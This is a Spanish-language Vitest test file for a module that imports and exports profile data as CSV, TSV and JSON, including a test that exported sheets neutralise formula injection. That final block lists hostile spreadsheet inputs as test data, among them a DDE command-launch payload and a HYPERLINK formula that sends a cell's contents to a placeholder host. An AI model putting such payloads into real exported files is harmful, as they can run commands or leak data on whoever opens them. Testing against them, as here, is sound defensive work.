// Contrato del formato de importación (EP-006 · sub-slice 3, tarea 3.1; HU-088, HU-086): mismas
// columnas para exportar, plantilla e importar; listas con «;»; `[vaciar]`; detección del formato.
import { describe, expect, it } from "vitest";
import {
  CAMPOS_IMPORTACION,
  EJEMPLOS_PLANTILLA,
  VACIAR,
  detectarFormato,
  escribirCsv,
  escribirErrores,
  escribirJson,
  escribirTabla,
  formatearExperiencia,
  sinNeutralizar,
  leer,
  leerExperiencia,
  normalizarEncabezado,
  partirLista,
  unirLista,
} from "./importacion";

describe("columnas del formato", () => {
  it("una por campo, con encabezado autoexplicativo y ejemplo; los internos marcados", () => {
    for (const c of CAMPOS_IMPORTACION) {
      expect(c.encabezado.length, c.clave).toBeGreaterThan(4);
      expect(c.ejemplo, c.clave).not.toBe("");
    }
    expect(CAMPOS_IMPORTACION.filter((c) => c.interno).map((c) => c.clave)).toEqual([
      "disponibilidad",
      "vinculo",
      "motivoPausa",
    ]);
    for (const c of CAMPOS_IMPORTACION.filter((x) => x.interno)) expect(c.encabezado).toMatch(/· interno$/);
  });
  it("nunca hay columna de consentimiento ni de la lista negra B.4", () => {
    // La fecha de la evaluación DISC sí viaja (B.7, HU-191); el resultado DISC detallado (B.4), no.
    const todo = CAMPOS_IMPORTACION.filter((c) => c.clave !== "discFecha")
      .map((c) => `${c.clave} ${c.encabezado}`)
      .join(" ")
      .toLowerCase();
    expect(todo).not.toMatch(/consentim|foto|correo|tel[eé]fono|hoja de vida|motivaci|aportar|promedio|disc/);
  });
});

describe("detección del formato (HU-086)", () => {
  it("JSON, celdas de hoja de cálculo y CSV sin preguntar; lo dudoso se pregunta", () => {
    expect(detectarFormato('[{"codigo":"PS-0142"}]')).toEqual({ formato: "json" });
    expect(detectarFormato("codigo\tdisponibilidad\nPS-0142\t2026-11-01")).toEqual({ formato: "tsv" });
    expect(detectarFormato('codigo,tecnologias\nPS-0142,"Java; Kafka"')).toEqual({ formato: "csv" });
    expect(detectarFormato("codigo\nPS-0142")).toEqual({ formato: null, motivo: "ambiguo" });
    expect(detectarFormato("   ")).toEqual({ formato: null, motivo: "vacio" });
  });
  it("lee celdas pegadas de Excel con número de fila y la línea original", () => {
    const r = leer("codigo\tdisponibilidad\r\nPS-0142\tDisponible ahora\r\n\r\nPS-0187\t\r\n");
    expect(r.ok && r.formato).toBe("tsv");
    if (!r.ok) return;
    expect(r.tabla.encabezados).toEqual(["codigo", "disponibilidad"]);
    expect(r.tabla.filas).toEqual([
      { numero: 2, celdas: ["PS-0142", "Disponible ahora"], original: "PS-0142\tDisponible ahora" },
      { numero: 3, celdas: ["PS-0187", ""], original: "PS-0187\t" },
    ]);
  });
  it("CSV con comillas, comas y saltos dentro de la celda", () => {
    const r = leer('codigo,resumen\nPS-0142,"Pagos, conciliación y ""cierre""\nde mes"\n');
    expect(r.ok && r.tabla.filas[0]!.celdas).toEqual(["PS-0142", 'Pagos, conciliación y "cierre"\nde mes']);
  });
  it("JSON: listas a «;», null a [vaciar]; más filas que el límite se rechaza", () => {
    const r = leer('[{"codigo":"PS-0142","tecnologias":["Java","Kafka"],"motivoPausa":null}]');
    expect(r.ok && r.tabla.filas[0]!.celdas).toEqual(["PS-0142", "Java; Kafka", VACIAR]);
    expect(leer("{no es json")).toMatchObject({ ok: false, motivo: "json_invalido" });
    const muchas = ["codigo\tx", ...Array.from({ length: 201 }, (_, i) => `PS-${String(i).padStart(4, "0")}\tx`)].join("\n");
    expect(leer(muchas)).toMatchObject({ ok: false, motivo: "demasiadas_filas" });
  });
});

describe("listas y experiencias en una celda", () => {
  it("«;» separa; «\;» no", () => {
    expect(partirLista("Java;  Spring Boot ;Kafka; ")).toEqual(["Java", "Spring Boot", "Kafka"]);
    expect(partirLista(unirLista(["a; b", "c"]))).toEqual(["a; b", "c"]);
  });
  it("experiencia: ida y vuelta, con y sin cliente o periodo", () => {
    const e = { cargo: "Backend senior", cliente: "Bancolombia", desde: 2021, hasta: 2026, descripcion: "Pagos: Kafka" };
    expect(leerExperiencia(formatearExperiencia(e))).toEqual({ ...e, descripcion: "Pagos: Kafka" });
    const sin = { cargo: "QA", cliente: null, desde: 2020, hasta: null, descripcion: "Automatización" };
    expect(leerExperiencia(formatearExperiencia(sin))).toEqual(sin);
    expect(leerExperiencia("sin dos puntos")).toBeNull();
    expect(leerExperiencia("QA · X · dos mil: algo")).toBeNull();
  });
});

describe("exportar y plantilla (HU-088)", () => {
  it("la hoja exportada tiene los mismos encabezados que la plantilla y se vuelve a leer igual", () => {
    const csv = escribirCsv(EJEMPLOS_PLANTILLA);
    const r = leer(csv);
    expect(r.ok && r.formato).toBe("csv");
    if (!r.ok) return;
    expect(r.tabla.encabezados).toEqual(CAMPOS_IMPORTACION.map((c) => c.encabezado));
    const nuevo = r.tabla.filas[1]!.celdas;
    expect(nuevo[CAMPOS_IMPORTACION.findIndex((c) => c.clave === "tecnologias")]).toBe("Java; Spring Boot; Kafka");
  });
  it("tres ejemplos: actualizar un campo, crear uno nuevo y archivar uno", () => {
    const [actualizar, crear, archivar] = EJEMPLOS_PLANTILLA;
    expect(Object.keys(actualizar!)).toEqual(["codigo", "disponibilidad"]);
    expect(Object.keys(crear!).length).toBeGreaterThan(15);
    expect(archivar).toEqual({ codigo: "PS-0099", estado: "archivado" });
  });
  it("JSON con las claves del formato: se lee sin conversión a la misma tabla", () => {
    const j = escribirJson(EJEMPLOS_PLANTILLA);
    const r = leer(j);
    expect(r.ok && r.formato).toBe("json");
    if (!r.ok) return;
    expect(r.tabla.filas).toHaveLength(3);
    expect(JSON.parse(j)[1].tecnologias).toEqual(["Java", "Spring Boot", "Kafka"]);
  });
  it("los encabezados se reconocen normalizados (acentos, paréntesis, «· interno»)", () => {
    expect(normalizarEncabezado("Disponible desde (AAAA-MM-DD…) · interno")).toBe("disponible desde");
    expect(normalizarEncabezado("  Código ")).toBe("codigo");
  });
});

describe("emparejamiento con las columnas reales del formato (HU-086)", () => {
  it("los encabezados de la exportación y las claves del JSON se emparejan solos, uno a uno", async () => {
    const { proponerEmparejamiento, camposEmparejados } = await import(
      "@ps/dominio/importacion/emparejar"
    );
    for (const nombres of [
      CAMPOS_IMPORTACION.map((c) => c.encabezado),
      CAMPOS_IMPORTACION.map((c) => c.clave),
    ]) {
      const e = proponerEmparejamiento(nombres, CAMPOS_IMPORTACION);
      expect(camposEmparejados(e).map((c) => c.clave)).toEqual(CAMPOS_IMPORTACION.map((c) => c.clave));
      expect(e.some((c) => c.bloqueada)).toBe(false);
    }
  });
});

describe("archivo de filas con error (HU-142)", () => {
  const encabezados = ["Código", "Años", "Notas, con coma"];
  const filas = [
    { celdas: ["PS-1001", "muchos", 'dijo "hola"'], motivo: "Años: «muchos» no es un número" },
    { celdas: ["PS-1002", "", "a\tb"], motivo: "Código: repetido" },
  ];

  it("CSV: el formato en que llegó, con la columna Motivo al final, y se vuelve a leer igual", () => {
    const t = escribirErrores("csv", encabezados, filas);
    const l = leer(t, "csv");
    if (!l.ok) throw new Error(l.motivo);
    expect(l.tabla.encabezados).toEqual([...encabezados, "Motivo"]);
    expect(l.tabla.filas.map((f) => f.celdas)).toEqual([
      ["PS-1001", "muchos", 'dijo "hola"', "Años: «muchos» no es un número"],
      ["PS-1002", "", "a\tb", "Código: repetido"],
    ]);
  });

  it("TSV (pegado de Excel): tabuladores como separador, celdas con tabulador entre comillas", () => {
    const t = escribirErrores("tsv", encabezados, filas);
    expect(t.split("\r\n")[0]).toBe("Código\tAños\tNotas, con coma\tMotivo");
    const l = leer(t, "tsv");
    if (!l.ok) throw new Error(l.motivo);
    expect(l.tabla.filas[1]!.celdas).toEqual(["PS-1002", "", "a\tb", "Código: repetido"]);
  });

  it("JSON: un objeto por fila con las columnas que trajo y su motivo", () => {
    expect(JSON.parse(escribirErrores("json", encabezados, filas))).toEqual([
      { Código: "PS-1001", Años: "muchos", "Notas, con coma": 'dijo "hola"', motivo: "Años: «muchos» no es un número" },
      { Código: "PS-1002", "Notas, con coma": "a\tb", motivo: "Código: repetido" },
    ]);
  });
});

describe("las hojas exportadas no ejecutan fórmulas al abrirse (Release Gate R0, security MEDIO-1)", () => {
  const PELIGROSAS = ["=1+1", "+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)", "\tx", "\rx"];

  it("escribirTabla antepone un apóstrofo a las celdas que Excel leería como fórmula, en CSV y TSV", () => {
    for (const formato of ["csv", "tsv"] as const) {
      const salida = escribirTabla(formato, ["a"], PELIGROSAS.map((c) => [c]));
      for (const c of ["=1+1", "@SUM(A1)", "-2+3"]) expect(salida, `${formato} ${c}`).toContain(`'${c}`);
      expect(salida).not.toMatch(/(^|[\n,\t])=1\+1/);
    }
  });

  it("escribirCsv también, sin tocar el texto normal ni las fechas", () => {
    const salida = escribirCsv([{ codigo: "PS-0142", resumen: '=HYPERLINK("https://x/?d="&B2,"ver")', disponibilidad: "2026-11-01" }]);
    expect(salida).toContain(`"'=HYPERLINK(""https://x/?d=""&B2,""ver"")"`);
    expect(salida).toContain(",2026-11-01,");
    expect(salida).toContain("PS-0142");
  });

  it("al volver a importar, el apóstrofo de neutralizar se quita (la ida y vuelta queda igual)", () => {
    for (const c of PELIGROSAS) expect(sinNeutralizar(`'${c}`)).toBe(c);
    expect(sinNeutralizar("'normal")).toBe("'normal");
    expect(sinNeutralizar("texto")).toBe("texto");
  });
});
